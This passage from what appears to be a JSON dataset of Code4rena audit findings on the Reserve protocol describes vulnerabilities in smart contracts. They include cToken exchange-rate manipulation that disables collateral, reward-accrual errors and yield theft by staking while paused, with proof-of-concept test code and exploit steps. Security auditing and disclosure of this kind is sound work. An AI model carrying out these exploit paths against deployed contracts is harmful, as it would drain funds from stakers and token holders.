type. May have to find another or write your own."}, {"title": "Adversary can abuse a quirk of compound redemption to manipulate the underlying exchange rate and maliciously disable cToken collaterals", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/310", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L121-L165   # Vulnerability details  ## Impact  Adversary can maliciously disable cToken collateral to cause loss to rToken during restructuring  ## Proof of Concept      if (referencePrice < prevReferencePrice) {         markStatus(CollateralStatus.DISABLED);     }  CTokenNonFiatCollateral and CTokenFiatCollateral both use the default refresh behavior presented in FiatCollateral which has the above lines which automatically disables the collateral if the reference price ever decreases. This makes the assumption that cToken exchange rates never decrease but this is an incorrect assumption and can be exploited by an attacker to maliciously disable a cToken being used as collateral.  [CToken.sol](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L480-L505)          uint redeemTokens;         uint redeemAmount;         /* If redeemTokensIn > 0: */         if (redeemTokensIn > 0) {             /*              * We calculate the exchange rate and the amount of underlying to be redeemed:              *  redeemTokens = redeemTokensIn              *  redeemAmount = redeemTokensIn x exchangeRateCurrent              */             redeemTokens = redeemTokensIn;             redeemAmount = mul_ScalarTruncate(exchangeRate, redeemTokensIn);         } else {             /*              * We get the current exchange rate and calculate the amount to be redeemed:              *  redeemTokens = redeemAmountIn / exchangeRate              *  redeemAmount = redeemAmountIn              */              // @audit redeemTokens rounds in favor of the user              redeemTokens = div_(redeemAmountIn, exchangeRate);             redeemAmount = redeemAmountIn;         }  The exchange rate can be manipulated by a tiny amount during the redeem process. The focus above is the scenario where the user requests a specific amount of underlying. When calculating the number of cTokens to redeem for a specific amount of underlying it rounds IN FAVOR of the user. This allows the user to redeem more underlying than the exchange rate would otherwise imply. Because the user can redeem *slightly* more than intended they can create a scenario in which the exchange rate actually drops after they redeem. This is because compound calculates the exchange rate dynamically using the current supply of cTokens and the assets under management.  [CToken.sol](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L293-L312)      function exchangeRateStoredInternal() virtual internal view returns (uint) {         uint _totalSupply = totalSupply;         if (_totalSupply == 0) {             /*              * If there are no tokens minted:              *  exchangeRate = initialExchangeRate              */             return initialExchangeRateMantissa;         } else {             /*              * Otherwise:              *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply              */             uint totalCash = getCashPrior();             uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;             uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;               return exchangeRate;         }     }  The exchangeRate when _totalSupply != 0 is basically:      exchangeRate = netAssets * 1e18 / totalSupply  Using this formula for we can now walk through an example of how this can be exploited  Example:  cTokens always start at a whole token ratio of 50:1 so let's assume this ratio to begin with. Let's use values similar to the current supply of cETH which is ~15M cETH and ~300k ETH. We'll start by calculating the current ratio:      exchangeRate = 300_000 * 1e18 * 1e18 / 15_000_000 * 1e8 = 2e26   Now to exploit the ratio we request to redeem 99e8 redeemAmount which we can use to calculate the amount of tokens we need to burn:      redeemAmount = 99e8 * 1e18 / 2e26 = 1.98 -> 1  After truncation the amount burned is only 1. Now we can recalculate our ratio:      exchangeRate = ((300_000 * 1e18 * 1e18) - 99e8) / ((15_000_000 * 1e8) - 1) = 199999999999999933333333333  The ratio has now been slightly decreased. In CTokenFiatCollateral the exchange rate is truncated to 18 dp so:      (referencePrice < prevReferencePrice) -> (19999999999999993 <  2e18) == true   This results in that the collateral is now disabled. This forces the vault to liquidate their holdings to convert to a backup asset. This will almost certainly incur losses to the protocol that were maliciously inflicted.  The path to exploit is relatively straightforward:  `refresh()` cToken collateral to store current rate -> Manipulate compound rate via redemption -> `refresh()` cToken collateral to disable  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Since the issue is with the underlying compound contracts, nothing can make the attack impossible but it can be made sufficiently difficult. The simplest deterrent would be to implement a rate error value (i.e. 100) so that the exchange rate has to drop more than that before the token is disabled. The recommended value for this is a bit more complicated to unpack. The amount that the exchange rate changes heavily depends on the number of cTokens minted. The larger the amount the less it changes. Additionally a malicious user can make consecutive redemptions to lower the rate even further. Using an error rate of 1e12 would make it nearly impossible for this to be exploited while still being very sensitive to real (and concerning) changes in exchange rate.      -   if (referencePrice < prevReferencePrice) {     +   if (referencePrice < prevReferencePrice - rateError) {             markStatus(CollateralStatus.DISABLED);         }"}, {"title": "Should Accrue Before Change, Loss of Rewards in case of change of settings", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/287", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-01-reserve-findings", "body": "# Lines of code   https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L820-L832   # Vulnerability details   In `StRSR.sol`, `_payoutRewards` is used to accrue the value of rewards based on the time that has passed since `payoutLastPaid`  Because of it's dependence on `totalStakes`, `stakeRate` and time, the function is rightfully called on every `stake` and `unstake`.  There is a specific instance, in which `_payoutRewards` should also be called, which could create either an unfair reward stream or a governance attack and that's when `setRewardPeriod` and `setRewardRatio` are called.  If you imagine the ratio at which rewards are paid out as a line, then you can see that by changing `rewardRatio` and `period` you're changing it's slope.  You should then agree, that while governance can *rightfully* change those settings, it should `_payoutRewards` first, to ensure that the slope of rewards changes only for rewards to be distributed after the setting has changed.  ## Mitigation Functions that change the slope or period size should accrue rewards up to that point.  This is to avoid: - Incorrect reward distribution - Change (positive or negative) of rewards from the past  Without accrual, the change will apply retroactively from `payoutLastPaid`  Which could: - Change the period length prematurely - Start a new period inadvertently - Cause a gain or loss of yield to stakers  Instead of starting a new period  ## Suggested refactoring  ```solidity function setRewardPeriod(uint48 val) public governance {     require(val > 0 && val <= MAX_REWARD_PERIOD, \"invalid rewardPeriod\");     _payoutRewards(); // @audit Payout rewards for fairness     emit RewardPeriodSet(rewardPeriod, val);     rewardPeriod = val;     require(rewardPeriod * 2 <= unstakingDelay, \"unstakingDelay/rewardPeriod incompatible\"); }  function setRewardRatio(uint192 val) public governance {     require(val <= MAX_REWARD_RATIO, \"invalid rewardRatio\");     _payoutRewards(); // @audit Payout rewards for fairness     emit RewardRatioSet(rewardRatio, val);     rewardRatio = val; } ```"}, {"title": "BackingManager: rsr is distributed across all rsr revenue destinations which is a loss for rsr stakers", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/276", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-12"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179   # Vulnerability details  ## Impact The `BackingManager.handoutExcessAssets` function sends all `rsr` that the `BackingManager` holds to the `rsrTrader` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179)).    The purpose of this is that `rsr` which can be held by the `BackingManager` due to seizure from the `StRSR` contract is sent back entirely to the `StRSR` contract and not - as would happen later in the function ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242)) - shared across `rsrTrader` and `rTokenTrader`.    The `rsrTrader` then sends the `rsr` to the `Distributor` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65)).    So far so good. However the `Distributor` does not necessarily send all of the `rsr` to the `StRSR` contract. Instead it distributes the `rsr` according to its distribution table. I.e. there can be multiple destinations each receiving a share of the `rsr` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136)).    In economic terms, `rsr` that is thereby not sent to `StRSR` but to other destinations, is a transfer of funds from stakers to these destinations, i.e. a loss to stakers.    Stakers should only pay for recollateralization of the `RToken`, not however send revenue to `rsr` revenue destinations.    ## Proof of Concept Assume the following situation:    * A seizure of `rsr` from the `StRSR` contract occurred because the `RToken` was under-collateralized.    * A trade occurred which restored collateralization. However not all `rsr` was sold by the trade and was returned to the `BackingManager`.    Now `BackingManager.manageTokens` is called which due to the full collateralization calls `BackingManager.handoutExcessAssets` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118)).    This sends `rsr` to the `rsrTrader` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179)).    Then the `rsr` is sent to the `Distributor` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65)).    There it is distributed across all `rsr` destinations ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136)).    ## Tools Used VSCode  ## Recommended Mitigation Steps `rsr` should be sent from the `BackingManager` directly to `StRSR` without the need to go through `rsrTrader` and `Distributor`. Thereby it won't be sent to other `rsr` revenue destinations.    Fix:    ``` diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol index 431e0796..eb506004 100644 --- a/contracts/p1/BackingManager.sol +++ b/contracts/p1/BackingManager.sol @@ -173,7 +173,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {          if (rsr.balanceOf(address(this)) > 0) {              // For CEI, this is an interaction \"within our system\" even though RSR is already live              IERC20Upgradeable(address(rsr)).safeTransfer( -                address(rsrTrader), +                address(stRSR),                  rsr.balanceOf(address(this))              );          } ```  There is a caveat to this however:    It is possible for `rsr` to be a reward token for a collateral of the `RToken`.   Neither the current implementation nor the proposed fix addresses this and instead sends the rewards to `StRSR`.    In principal, `rsr` that was rewarded should have a share that goes to the `rTokenTrader` as well as include all `rsr` revenue destinations.   However there is no easy way to differentiate where the `rsr` came from.    Therefore I think it is reasonable to send all `rsr` to `StRSR` and make it clear to developers and users that `rsr` rewards cannot be paid out to `rToken` holders.   "}, {"title": "RToken permanently insolvent/unusable if a single collateral in the basket behaves unexpectedly ", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-16"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87   # Vulnerability details  ## Impact  Asset plugins assume underlying collateral tokens will always behave as they are expected at the time of the plugin creation. This assumption can be incorrect because of multiple reasons such as upgrades/rug pulls/hacks.  In case a single collateral token in a basket of assets causes functions in the asset to fail the whole RToken functionality will be broken. This includes (and not limited to): 1. Users cannot redeem RTokens for any collateral 2. Users cannot issue RTokens 3. Bad collateral token cannot be unregistered 4. Stakers will not be able to unstake 5. Recollateralization will not be possible 6. Basket cannot be updated  The impacts become permanent as the unregistering of bad collateral assets is also dependent on collateral token behavior.  Emphasis of funds lost: A basket holds 2 collateral assets [cAssetA, cAssetB] where cAssetA holds 1% of the RToken collateral and cAssetB holds 99%. cAssetA gets hacked and self-destructed. This means it will revert on any interaction with it.  Even though 99% of funds still exists in cAssetB. They will be permanently locked and RToken will be unusable   ## Proof of Concept  Lets assume a `CTokenFiatCollateral` of `cUSDP` is registered as an asset in `AssetRegistry`. One day, `cUSDP` deployer gets hacked and the contract self-destructs, therefore any call to the `cUSDP` contract will fail.  `cUSDP` is a proxy contract: https://etherscan.io/address/0x041171993284df560249B57358F931D9eB7b925D#readProxyContract  Note: There could be other reasons that calls to `cUSDP` will revert such as:  1. Upgrade to implementation to change/deprecate functions 2. Freezing of contract for a long duration of time (due to patching) 3. blacklisting/whitelisitng callers.   ### Bad collateral assets cannot be unregistered  Lets describe the flow of unregistering an asset from the `AssetRegistry`: `governance` needs to call `unregister` in order to unregister and asset: https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87 ```     function unregister(IAsset asset) external governance {         require(_erc20s.contains(address(asset.erc20())), \"no asset to unregister\");         require(assets[asset.erc20()] == asset, \"asset not found\");         uint192 quantity = basketHandler.quantity(asset.erc20());          _erc20s.remove(address(asset.erc20()));         assets[asset.erc20()] = IAsset(address(0));         emit AssetUnregistered(asset.erc20(), asset);          if (quantity > 0) basketHandler.disableBasket();     } ```  As can seen above, `basketHandler.quantity(asset.erc20());` is called as part of the unregister flow. `quantity` function in `basketHandler`: https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300 ```     function quantity(IERC20 erc20) public view returns (uint192) {         try assetRegistry.toColl(erc20) returns (ICollateral coll) {             if (coll.status() == CollateralStatus.DISABLED) return FIX_ZERO;              uint192 refPerTok = coll.refPerTok(); // {ref/tok}             if (refPerTok > 0) {                 // {tok/BU} = {ref/BU} / {ref/tok}                 return basket.refAmts[erc20].div(refPerTok, CEIL);             } else {                 return FIX_MAX;             }         } catch {             return FIX_ZERO;         }     } ```  The asset is still registered so the `try` call will succeed and `coll.refPerTok(); ` will be called.  `refPerTok` function in `CTokenFiatCollateral` (which is used as an asset of `cUSDP`): https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45 ```     function refPerTok() public view override returns (uint192) {         uint256 rate = ICToken(address(erc20)).exchangeRateStored();         int8 shiftLeft = 8 - int8(referenceERC20Decimals) - 18;         return shiftl_toFix(rate, shiftLeft);     } ```  if `ICToken(address(erc20)).exchangeRateStored();` will revert because of the previously defined reasons (hack, upgrade, etc..), the whole `unregister` call will be a reverted.  ### Explaination of impact  As long as the asset is registered and cannot be removed (explained above), many function calls will revert and cause the impacts in the `impact` section.  The main reason is the `refresh` function of `CTokenFiatCollateral` (used for `cUSDP`) depends on a call to `cUSDP` `exchangeRateCurrent` function.  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37 ```     function refresh() public virtual override {         // == Refresh ==         // Update the Compound Protocol         ICToken(address(erc20)).exchangeRateCurrent();          // Intentional and correct for the super call to be last!         super.refresh(); // already handles all necessary default checks     } ```    `AssetRegistry`s `refresh` function calls refresh to all registered assets: https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50 ```     function refresh() public {         // It's a waste of gas to require notPausedOrFrozen because assets can be updated directly         uint256 length = _erc20s.length();         for (uint256 i = 0; i < length; ++i) {             assets[IERC20(_erc20s.at(i))].refresh();         }     } ```  In our case, `CTokenFiatCollateral.refresh()` will revert therefore the call to `AssetRegistry.refresh()` will revert.  `AssetRegistry.refresh()` is called in critical functions that will revert: 1. `_manageTokens` - used manage backing policy, handout excess assets and perform recollateralization (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L107) 2. `refreshBucket` - used to switch the basket configuration (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L184) 3. `issue` - used to issue RTokens to depositors (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L194) 4. `vest` - used to vest issuance of an account (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L380) 5. `redeem` - used to redeem collateral assets for RTokens (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L443) 6. `poke` - in main, used as a refresher (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Main.sol#L45) 7. `withdraw` in RSR, stakers will not be able to unstake (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L302)  ## Tools Used  Foundry, VS Code  ## Recommended Mitigation Steps  For plugins to function as intended there has to be a dependency on protocol specific function. In a case that the collateral token is corrupted, the governance should be able to replace to corrupted token. The unregistering flow should never be depended on the token functionality.  "}, {"title": "Basket range formula is inefficient, leading the protocol to unnecessary haircut", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/235", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202   # Vulnerability details    ## Impact The `BackingManager.manageTokens()` function checks if there's any deficit in collateral, in case there is, if there's a surplus from another collateral token it trades it to cover the deficit, otherwise it goes for a 'haircut' and cuts the amount of basket 'needed' (i.e. the number of baskets RToken claims to hold). In order to determine how much deficit/surplus there is the protocol calculates the 'basket range', where the top range is the optimistic estimation of the number of baskets the token would hold after trading and the bottom range is a pessimistic estimation.  The estimation is done by dividing the total collateral value by the price of 1  basket unit (for optimistic estimation the max value is divided by min price of basket-unit and vice versa). The problem is that this estimation is inefficient, for cases where just a little bit of collateral is missing the range 'band' (range.top - range.bottom) would be about 4% (when oracle error deviation is \u00b11%) instead of less than 1%.  This can cause the protocol an unnecessary haircut of a few percent where the deficit can be solved by simple trading.  This would also cause the price of `RTokenAsset` to deviate more than necessary before the haircut.   ## Proof of Concept In the following PoC, the basket changed so that it has 99% of the required collateral for 3 tokens and 95% for the 4th. The basket range should be 98\u00b10.03% (the basket has 95% collateral + 4% of 3/4 tokens. That 4% is worth 3\u00b10.03% if we account for oracle error of their prices), but in reality the protocol calculates it as ~97.9\u00b12%. That range causes the protocol to avoid trading and go to an unnecessary haircut to ~95%   ```diff diff --git a/contracts/plugins/assets/RTokenAsset.sol b/contracts/plugins/assets/RTokenAsset.sol index 62223442..03d3c3f4 100644 --- a/contracts/plugins/assets/RTokenAsset.sol +++ b/contracts/plugins/assets/RTokenAsset.sol @@ -123,7 +123,7 @@ contract RTokenAsset is IAsset {      // ==== Private ====        function basketRange() -        private +        public          view          returns (RecollateralizationLibP1.BasketRange memory range)      { diff --git a/test/Recollateralization.test.ts b/test/Recollateralization.test.ts index 3c53fa30..386c0673 100644 --- a/test/Recollateralization.test.ts +++ b/test/Recollateralization.test.ts @@ -234,7 +234,42 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {          // Issue rTokens          await rToken.connect(addr1)['issue(uint256)'](issueAmount)        }) +      it('PoC basket range', async () => { +        let range = await rTokenAsset.basketRange(); +        let basketTokens = await basketHandler.basketTokens(); +        console.log({range}, {basketTokens}); +        // Change the basket so that current balance would be 99 or 95 percent of +        // the new basket +        let q99PercentLess = 0.25 / 0.99; +        let q95ercentLess = 0.25 / 0.95; +        await basketHandler.connect(owner).setPrimeBasket(basketTokens, [fp(q99PercentLess),fp(q99PercentLess), fp(q95ercentLess), fp(q99PercentLess)]) +        await expect(basketHandler.connect(owner).refreshBasket()) +        .to.emit(basketHandler, 'BasketSet') + +        expect(await basketHandler.status()).to.equal(CollateralStatus.SOUND) +        expect(await basketHandler.fullyCollateralized()).to.equal(false) + +        range = await rTokenAsset.basketRange(); + +        // show the basket range is 95.9 to 99.9 +        console.log({range});   +        let needed = await rToken.basketsNeeded(); + +        // show that prices are more or less the same +        let prices = await Promise.all( basket.map(x => x.price())); + +        // Protocol would do a haircut even though it can easily do a trade +        await backingManager.manageTokens([]); + +        // show how many baskets are left after the haircut +         needed = await rToken.basketsNeeded(); +          +        console.log({prices, needed}); +        return; +     +      }) +      return;        it('Should select backup config correctly - Single backup token', async () => {          // Register Collateral          await assetRegistry.connect(owner).register(backupCollateral1.address) @@ -602,7 +637,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {          expect(quotes).to.eql([initialQuotes[0], initialQuotes[1], initialQuotes[3], bn('0.25e18')])        })      }) - +    return;      context('With multiple targets', function () {        let issueAmount: BigNumber        let newEURCollateral: FiatCollateral @@ -785,7 +820,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {        })      })    }) - +  return;    describe('Recollateralization', function () {      context('With very simple Basket - Single stablecoin', function () {        let issueAmount: BigNumber  ```  Output (comments are added by me):  ``` {   range: [     top: BigNumber { value: \"99947916501440267201\" },  //  99.9 basket units     bottom: BigNumber { value: \"95969983506382791000\" } // 95.9 basket units   ] } {   prices: [     [       BigNumber { value: \"990000000000000000\" },       BigNumber { value: \"1010000000000000000\" }     ],     [       BigNumber { value: \"990000000000000000\" },       BigNumber { value: \"1010000000000000000\" }     ],     [       BigNumber { value: \"990000000000000000\" },       BigNumber { value: \"1010000000000000000\" }     ],     [       BigNumber { value: \"19800000000000000\" },       BigNumber { value: \"20200000000000000\" }     ]   ],   needed: BigNumber { value: \"94999999905000000094\" } // basket units after haircut: 94.9 } ```  ## Recommended Mitigation Steps Change the formula so that we first calculate the 'base' (i.e. the min amount of baskets the RToken can satisfy without trading): ``` base = basketsHeldBy(backingManager) // in the PoC's case it'd be 95 (diffLowValue, diffHighValue) = (0,0)  for each collateral token:     diff = collateralBalance - basketHandler.quantity(base)      (diffLowValue, diffHighValue) = diff * (priceLow, priceHigh) addBasketsLow = diffLowValue / basketPriceHigh addBasketHigh = diffHighValue / basketPriceLow range.top = base + addBasketHigh range.bottom = base + addBasketLow ```"}, {"title": "If name is changed then the domain seperator would be wrong.", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/211", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-18"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L803 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L791   # Vulnerability details  ### Vulnerability Details  In `StRSR.sol` the `_domainSeparatorV4` is calculated using the EIP-721 standard, which uses the `name` and `version` that are passed in the init at the function call `__EIP712_init(name, \"1\");`  Now, governance can change this `name` anytime using the following function:  ```solidity function setName(string calldata name_) external governance {         name = name_;     } ```  After that call the domain seperator would still be calculated using the old name, which shouldn\u2019t be the case.   ### Impact  The permit transactions and vote delegation would be reverted if the domain seperator is wrong.   ### Recommendation  While changing the name in in setName function. update the domain seperator."}, {"title": "Loss of staking yield for stakers when another user stakes in pause/frozen state", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/148", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-21"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215   # Vulnerability details  ### Details It is possible for a user to steal the yield from other stakers by staking when the system is paused or frozen.  This is because staking is allowed while paused/frozen, but `_payoutRewards()` is not called during so. Staking rewards are not paid out to current stakers when a new staker stakes, so the new staker immediately gets a portion of the rewards, without having to wait for a reward period. ```sol function stake(uint256 rsrAmount) external {  require(rsrAmount > 0, \"Cannot stake zero\");    if (!main.pausedOrFrozen()) _payoutRewards();  ... } ```  ### Proof of concept A test case can be included in `ZZStRSR.test.ts` under 'Add RSR / Rewards': ```js     it('Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state', async () => {       await rsr.connect(addr1).approve(stRSR.address, stake)       await stRSR.connect(addr1).stake(stake)        await advanceTime(Number(config.rewardPeriod) * 5)       await main.connect(owner).pause()        await rsr.connect(addr2).approve(stRSR.address, stake)       await stRSR.connect(addr2).stake(stake)        await main.connect(owner).unpause()        await stRSR.connect(addr1).unstake(stake)       await stRSR.connect(addr2).unstake(stake)       await advanceTime(Number(config.unstakingDelay) + 1)        await stRSR.connect(addr1).withdraw(addr1.address, 1)       await stRSR.connect(addr2).withdraw(addr2.address, 1)       const addr1RSR = await rsr.balanceOf(addr1.address)       const addr2RSR = await rsr.balanceOf(addr2.address)       console.log(`addr1 RSR = ${addr1RSR}`)       console.log(`addr2 RSR = ${addr2RSR}`)       expect(Number(addr1RSR)).to.be.approximately(Number(addr2RSR), 10)     }) ``` Note that `await advanceTime(Number(config.rewardPeriod) * 5)` can be before or after the pause, same result will occur  Run with: `yarn test:p1 --grep \"Audit\"`  Output: ```shell addr1 RSR = 10000545505689818061216 addr2 RSR = 10000545505689818061214    StRSRP1 contract     Add RSR / Rewards       \u2714 Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state (1504ms)                                                                                       (1504ms)     1 passing (2m) ```  The PoC demonstrates that the staker2 stole half of the rewards from staker1. staker1 staked for 5 `rewardPeriod`, staker2 did not have to wait at all, but still received half of the reward share.  ### Impact This should fall into \"Theft of unclaimed yield\", suggesting High risk. But the amount of RSR that can be stolen depends on the liveliness of the staking pool (how often `_payoutRewards()` is called). If the time window between the last `stake(...)/unstake(...)/payoutRewards(...)` and `pause()/freezeUntil(...)` is small, then no/less RSR yield can be stolen.   `system-design.md` rewardPeriod: ``` Default value: `86400` = 1 day Mainnet reasonable range: 10 to 31536000 (1 year) ``` For RTokens which choose a smaller value for `rewardPeriod`, the risk is higher. If `rewardPeriod = 86400` like recommended, then for this attack to occur, no one must have called `stake(...)/unstake(...)/payoutRewards(...)` for 1 day before the pause/freeze occured.  Likelihood is Low for a reasonably set `rewardPeriod` and lively project. Therefore submitting as Medium risk.  ### Recommendations I'm unsure of why staking is allowed when paused/frozen and the reason for the line: ```sol \u00a0if (!main.pausedOrFrozen()) _payoutRewards(); ``` The team should consider the reason for the above logic.  If the above logic is required, then I would suggest that `poke()` in `Main.sol` be called inside of `pause()` and `freezeUntil(...)` to update the state **before** pausing/freezing. Since `distribute(...)` has modifier `notPausedOrFrozen`, I would assume in pause/frozen state, no RSR is sent to stRSR contract(i.e. no rewards when paused/frozen) so this recommendation should be sufficient in preventing the issue."}, {"title": "RecollateralizationLib: Dust loss for an asset should be capped at its low value", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/106", "labels": ["bug", "2 (Med Risk)", "judge review requested", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-22"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275   # Vulnerability details  ## Impact The `RecollateralizationLib.basketRange` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202)) internally calls the `RecollateralizationLib.totalAssetValue` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281)).    I will show in this report that the `RecollateralizationLib.totalAssetValue` function returns a value for `assetsLow` that is too low.    This in turn causes the `range.bottom` value 